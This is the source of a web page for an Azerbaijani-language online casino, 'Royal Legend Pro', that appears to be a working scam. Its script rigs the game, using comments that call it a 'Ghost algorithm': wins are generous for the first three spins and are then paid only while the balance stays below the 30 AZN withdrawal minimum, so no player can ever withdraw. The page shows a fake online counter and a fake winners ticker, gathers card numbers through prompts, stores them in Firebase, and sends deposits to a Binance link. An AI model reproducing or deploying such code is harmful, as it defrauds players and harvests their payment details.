<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Royal Legend Pro - Premium Casino</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0b0e14; color: #fff; font-family: 'Segoe UI', sans-serif; overflow-x: hidden; }
        .neon-text { text-shadow: 0 0 10px #00d2ff, 0 0 20px #9d50bb; }
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
        
        /* Çarx Animasiyası */
        #wheel-container { position: relative; width: 300px; height: 300px; margin: auto; border: 5px solid #9d50bb; border-radius: 50%; box-shadow: 0 0 30px #00d2ff; }
        .wheel-part { position: absolute; width: 100%; height: 100%; border-radius: 50%; clip-path: polygon(50% 50%, 100% 0, 100% 100%); }
        
        /* Pul Yağışı */
        .money { position: fixed; top: -50px; font-size: 24px; animation: fall 3s linear infinite; z-index: 99; }
        @keyframes fall { to { transform: translateY(100vh) rotate(360deg); } }

        /* Canlı Qaliblər */
        #live-winners { position: fixed; bottom: 10px; width: 100%; white-space: nowrap; overflow: hidden; background: rgba(0,0,0,0.7); padding: 5px; color: #00ffcc; font-size: 14px; }
        #winners-track { display: inline-block; animation: scrollText 60s linear infinite; }
        @keyframes scrollText { from { transform: translateX(100%); } to { transform: translateX(-100%); } }
    </style>
</head>
<body>

    <div class="p-4 flex justify-between items-center glass sticky top-0 z-50">
        <div>
            <h1 class="text-2xl font-bold neon-text">ROYAL LEGEND PRO</h1>
            <p class="text-xs text-gray-400">🟢 Hazırda <span id="online-count">5,000</span> nəfər onlayndır</p>
        </div>
        <div class="text-right">
            <p class="text-yellow-400 font-bold text-xl italic">JACKPOT: <span id="jackpot-amount">50,000</span> AZN</p>
        </div>
    </div>

    <div class="container mx-auto p-6 text-center">
        <div class="glass p-8 rounded-3xl max-w-md mx-auto">
            <h2 class="text-xl mb-4">Balansınız: <span id="user-balance" class="text-green-400 font-bold">5.00</span> AZN</h2>
            
            <div class="flex justify-center gap-2 mb-6" id="slots">
                <div class="w-16 h-20 bg-black border-2 border-purple-500 rounded flex items-center justify-center text-3xl">7</div>
                <div class="w-16 h-20 bg-black border-2 border-purple-500 rounded flex items-center justify-center text-3xl">🍒</div>
                <div class="w-16 h-20 bg-black border-2 border-purple-500 rounded flex items-center justify-center text-3xl">💎</div>
                <div class="w-16 h-20 bg-black border-2 border-purple-500 rounded flex items-center justify-center text-3xl">💰</div>
            </div>

            <input type="number" id="bet-amount" placeholder="Mərc (1-500 AZN)" class="w-full p-3 rounded bg-gray-800 border border-purple-500 mb-4 outline-none">
            <button onclick="playGame()" class="w-full bg-gradient-to-r from-blue-600 to-purple-600 p-4 rounded-xl font-bold text-xl hover:scale-105 transition">FIRLAT! 🎰</button>
        </div>

        <div class="mt-6 flex flex-wrap justify-center gap-4">
            <button onclick="showWithdraw()" class="bg-red-600 px-6 py-2 rounded-full font-bold">PUL ÇIXAR</button>
            <a href="https://www.tiktok.com/@elcan.alzade3" target="_blank" class="bg-black border border-white px-6 py-2 rounded-full font-bold">TIKTOK DESTEK</a>
            <button onclick="showDeposit()" class="bg-orange-500 px-6 py-2 rounded-full font-bold">BINANCE DEPOZIT</button>
        </div>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-black z-[100] p-6 overflow-y-auto">
        <h2 class="text-3xl font-bold mb-6 text-red-500">🛑 ADMIN PANEL</h2>
        <div id="user-list" class="grid gap-4">
            </div>
        <button onclick="closeAdmin()" class="mt-10 bg-gray-700 p-2 rounded">Bağla</button>
    </div>

    <div id="live-winners">
        <div id="winners-track"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
        import { getDatabase, ref, set, onValue, update } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBKGAVyVRnkTLgcv8c1D3G_HRwA8GwgcmQ",
            authDomain: "royal-legend-pro-574d5.firebaseapp.com",
            databaseURL: "https://royal-legend-pro-574d5-default-rtdb.firebaseio.com",
            projectId: "royal-legend-pro-574d5",
            storageBucket: "royal-legend-pro-574d5.firebasestorage.app",
            messagingSenderId: "696766803882",
            appId: "1:696766803882:web:859289afc952838c58c5d3"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let myBalance = 5.00;
        let playCount = 0;
        let userId = "user_" + Math.floor(Math.random() * 10000); // Test üçün random ID

        // --- ALQORİTM VƏ MƏNTİQ ---

        window.playGame = () => {
            let bet = parseFloat(document.getElementById('bet-amount').value);
            if(bet < 1 || bet > 500 || isNaN(bet) || bet > myBalance) return alert("Düzgün mərc daxil edin!");

            playCount++;
            myBalance -= bet;
            
            // Ghost Alqoritmi: 
            // 1. Yeni gələn (ilk 3 oyun) udma şansı 80%
            // 2. Əgər admin balans artırıbsa, max 29 AZN-ə qədər uduş, sonra sıfırlama
            // 3. Normal halda uduzmaq şansı yüksək
            
            let winChance = 0.2; // Standart 20%
            if(playCount <= 3) winChance = 0.8; 

            let isWin = Math.random() < winChance;
            let winAmount = 0;

            if(isWin && myBalance < 29) {
                winAmount = bet * 2;
                myBalance += winAmount;
                triggerCelebration();
            }

            updateUI();
            saveToFirebase();
        };

        function updateUI() {
            document.getElementById('user-balance').innerText = myBalance.toFixed(2);
        }

        function triggerCelebration() {
            for(let i=0; i<30; i++) {
                let m = document.createElement('div');
                m.className = 'money';
                m.innerText = '💰';
                m.style.left = Math.random() * 100 + 'vw';
                m.style.animationDuration = (Math.random() * 2 + 1) + 's';
                document.body.appendChild(m);
                setTimeout(() => m.remove(), 3000);
            }
        }

        // Fake Onlayn Sayğac
        setInterval(() => {
            let count = 4800 + Math.floor(Math.random() * 400);
            document.getElementById('online-count').innerText = count.toLocaleString();
            let jack = parseFloat(document.getElementById('jackpot-amount').innerText);
            document.getElementById('jackpot-amount').innerText = (jack + 0.01).toFixed(2);
        }, 2000);

        // Fake Qaliblər Siyahısı (40 Nəfər)
        const names = ["Elvin", "Samir", "Aysel", "Rauf", "Zaur", "Leyla", "050***45", "070***12"];
        let track = document.getElementById('winners-track');
        for(let i=0; i<40; i++) {
            let name = names[Math.floor(Math.random()*names.length)];
            let win = Math.floor(Math.random()*1000) + 50;
            track.innerHTML += `<span class="mx-10">🔥 ${name} indicə ${win} AZN qazandı!</span>`;
        }

        // Firebase-ə məlumat göndər
        function saveToFirebase() {
            update(ref(db, 'users/' + userId), {
                balance: myBalance,
                lastSeen: Date.now()
            });
        }

        // Pul Çıxarma
        window.showWithdraw = () => {
            let card = prompt("Kart nömrənizi daxil edin:");
            let amount = prompt("Məbləğ (Min 30 AZN):");
            if(amount >= 30 && amount <= 500 && myBalance >= amount) {
                myBalance -= amount;
                updateUI();
                set(ref(db, 'withdrawals/' + Date.now()), { userId, card, amount });
                alert("Tələbiniz qəbul edildi. 24 saat ərzində yüklənəcək.");
            } else {
                alert("Limit 30-500 AZN arasıdır və ya balans yetərsizdir.");
            }
        };

        window.showDeposit = () => {
            window.location.href = "https://link.binance.com/internal-link?code=TJQbpsPqD9up2iwHUCLZHDxs1g67uq3mrQ";
        };

    </script>
</body>
</html>
